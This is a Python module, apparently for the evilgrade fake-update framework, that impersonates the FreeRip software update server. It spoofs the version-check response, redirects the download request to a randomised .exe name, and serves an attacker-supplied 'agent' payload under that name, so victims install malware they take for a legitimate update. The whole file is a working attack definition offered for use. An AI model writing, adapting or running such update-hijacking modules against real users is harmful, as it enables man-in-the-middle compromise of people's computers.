from modules import ModuleBase


class FreeRip(ModuleBase):
    name = 'freerip'
    version = '1.0'
    appver = '< 3.30'
    author = ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.freerip.com)' 
    requests = [
        {   'path': '/hub.php\?s\=curver',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/freerip/dev',
        },
        {   'path': '/hub.php\?s\=download',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://www.freerip.com/freerip<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        },

        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
